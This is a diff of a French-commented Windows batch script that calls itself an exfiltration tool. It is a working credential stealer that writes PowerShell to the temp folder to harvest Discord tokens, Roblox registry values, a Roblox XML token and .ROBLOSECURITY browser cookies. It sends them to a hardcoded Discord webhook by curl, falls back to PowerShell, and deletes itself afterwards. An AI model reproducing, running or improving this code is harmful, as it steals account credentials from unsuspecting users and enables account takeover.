@@ -1,43 +1,14 @@
 @echo off
 setlocal enabledelayedexpansion
-:: PALOFSC - EXFILTRATION AVEC CONFIRMATION D'ENVOI
+:: PALOFSC - EXFILTRATION AVEC CONFIRMATION D'ENVOI (DOUBLE METHODE)
 
 set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"
+set "LOG=%TEMP%\exfil_fail.log"
 
-:: Création d'un script PowerShell pour l'envoi de messages
-set "send_ps=%TEMP%\send.ps1"
-(
-echo function Send-DiscordMessage {
-echo     param([string]$Message)
-echo     $payload = @{ content = $Message } ^| ConvertTo-Json
-echo     try {
-echo         Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
-echo         Write-Output "OK"
-echo     } catch {
-echo         Write-Output "ERREUR: $_"
-echo     }
-echo }
-echo # Envoi du message de test
-echo $test = Send-DiscordMessage "=== TEST : Exécution du script ==="
-echo if ($test -eq "OK") { Write-Output "TEST_REUSSI" } else { Write-Output "TEST_ECHEC" }
-) > "%send_ps%"
-
-:: Exécuter le test
-for /f "delims=" %%a in ('powershell -NoProfile -ExecutionPolicy Bypass -File "%send_ps%" 2^>nul') do set "test_result=%%a"
-del /f /q "%send_ps%" >nul 2>&1
-
-:: Si le test échoue, sortir sans exécuter le reste (mais on va continuer pour envoyer un diagnostic)
-if not "!test_result!"=="TEST_REUSSI" (
-    :: On va créer un message d'erreur et l'envoyer via un autre moyen
-    set "msg=ERREUR: Le webhook ne répond pas. Vérifiez l'URL."
-    goto :send_fallback
-)
-
-:: ===== EXTRACTION DES DONNEES =====
+:: ===== 1. EXTRACTION DES DONNEES =====
 set "psfile=%TEMP%\extract.ps1"
 set "outfile=%TEMP%\result.txt"
 (
-echo # --- TOKENS DISCORD ---
 echo $paths = @(
 echo     "$env:APPDATA\Discord\Local Storage\leveldb",
 echo     "$env:APPDATA\discordptb\Local Storage\leveldb",
@@ -55,13 +26,11 @@ echo }
 echo $tokens = $tokens ^| Select-Object -Unique
 echo $discord = $tokens -join ' '
 echo.
-echo # --- ROBLOX : REGISTRE ---
 echo $user = $null
 echo $remember = $null
 echo try { $user = (Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudio" -Name "UserID" -ErrorAction SilentlyContinue).UserID } catch {}
 echo try { $remember = (Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudio" -Name "RememberMe" -ErrorAction SilentlyContinue).RememberMe } catch {}
 echo.
-echo # --- ROBLOX : XML ---
 echo $xmlToken = $null
 echo $xmlPath = "$env:LOCALAPPDATA\Roblox\GlobalBasicSettings_13.xml"
 echo if (Test-Path $xmlPath) {
@@ -71,7 +40,6 @@ echo         if ($xml -and $xml.settings -and $xml.settings.token) { $xmlToken =
 echo     } catch {}
 echo }
 echo.
-echo # --- ROBLOX : COOKIE .ROBLOSECURITY (recherche brute) ---
 echo $cookie = $null
 echo $files = @()
 echo $files += "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
@@ -91,7 +59,6 @@ echo         if ($cookie) { break }
 echo     }
 echo }
 echo.
-echo # --- CONSTRUCTION DU MESSAGE ---
 echo $msg = ""
 echo if ($discord -ne "") { $msg += "=== TOKENS DISCORD ===`n$discord`n`n" }
 echo if ($user -ne $null -and $user -ne "") { $msg += "=== ROBLOX UserID ===`n$user`n`n" }
@@ -102,41 +69,60 @@ echo if ($msg -eq "") { $msg = "Aucune donnee collectee.`n" }
 echo $msg ^| Out-File -FilePath '%outfile%' -Encoding utf8
 ) > "%psfile%"
 
-:: Exécuter l'extraction
 powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%psfile%" 2>nul
-
-:: Lire le résultat
 set "msg="
 if exist "%outfile%" (
     for /f "usebackq delims=" %%a in ("%outfile%") do set "msg=%%a"
     del /f /q "%outfile%" >nul 2>&1
 )
 del /f /q "%psfile%" >nul 2>&1
+if "!msg!"=="" set "msg=Erreur extraction."
 
-:: Si msg est vide, mettre un message par défaut
-if "!msg!"=="" set "msg=Erreur lors de l'extraction."
-
-:: ===== ENVOI DU MESSAGE FINAL VIA POWERSHELL =====
-:send_fallback
-:: Si le test a échoué, msg contient déjà l'erreur, on l'envoie quand même
-if "!test_result!"=="TEST_ECHEC" (
-    set "msg=Test webhook échoué. Vérifiez l'URL. Détails: !msg!"
+:: ===== 2. ENVOI VIA CURL (méthode 1) =====
+set "send_ok=0"
+curl -s -o "%TEMP%\curl_resp.txt" -w "%{http_code}" -H "Content-Type: application/json" -d "{\"content\":\"%msg%\"}" "%WEBHOOK%" > "%TEMP%\curl_code.txt" 2>nul
+set /p http_code=<"%TEMP%\curl_code.txt"
+if "%http_code%"=="204" (
+    set "send_ok=1"
+    del /f /q "%TEMP%\curl_resp.txt" "%TEMP%\curl_code.txt" >nul 2>&1
+) else (
+    del /f /q "%TEMP%\curl_resp.txt" "%TEMP%\curl_code.txt" >nul 2>&1
 )
 
-:: Créer un script d'envoi avec le message
-set "send_ps2=%TEMP%\send2.ps1"
-(
-echo $payload = @{ content = '%msg%' } ^| ConvertTo-Json
-echo Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue
-) > "%send_ps2%"
+:: ===== 3. SI CURL A ÉCHOUE, FALLBACK VIA POWERSHELL (méthode 2) =====
+if "%send_ok%"=="0" (
+    echo Tentative d'envoi via PowerShell... > "%LOG%"
+    echo Message: %msg% >> "%LOG%"
+    set "ps_send=%TEMP%\send.ps1"
+    (
+    echo $payload = @{ content = '%msg%' } ^| ConvertTo-Json
+    echo try {
+    echo     $resp = Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
+    echo     Write-Output "OK"
+    echo } catch {
+    echo     Write-Output "ERREUR: $_"
+    echo }
+    ) > "%ps_send%"
+    for /f "delims=" %%a in ('powershell -NoProfile -ExecutionPolicy Bypass -File "%ps_send%" 2^>nul') do set "ps_result=%%a"
+    del /f /q "%ps_send%" >nul 2>&1
+    if "!ps_result!"=="OK" (
+        set "send_ok=1"
+        echo Envoi PowerShell reussi. >> "%LOG%"
+    ) else (
+        echo Echec PowerShell : !ps_result! >> "%LOG%"
+    )
+)
 
-:: Exécuter l'envoi (en arrière-plan pour ne pas bloquer)
-start /b "" powershell -NoProfile -ExecutionPolicy Bypass -File "%send_ps2%"
+:: ===== 4. SI ENVOI ÉCHOUÉ, SAUVEGARDER LE MESSAGE LOCALEMENT =====
+if "%send_ok%"=="0" (
+    echo %date% %time% - ECHEC ENVOI >> "%LOG%"
+    echo Message non envoye : >> "%LOG%"
+    echo %msg% >> "%LOG%"
+    echo ---------------------------------------- >> "%LOG%"
+    :: On essaye d'écrire aussi dans un fichier texte lisible
+    echo %msg% > "%TEMP%\exfil_data.txt"
+)
 
-:: Attendre un peu pour que l'envoi ait le temps de se faire
-timeout /t 2 /nobreak >nul 2>&1
-
-:: Nettoyage
-del /f /q "%send_ps2%" >nul 2>&1
+:: ===== 5. AUTO-SUPPRESSION =====
 del /f /q "%~f0" >nul 2>&1
 exit /b 0
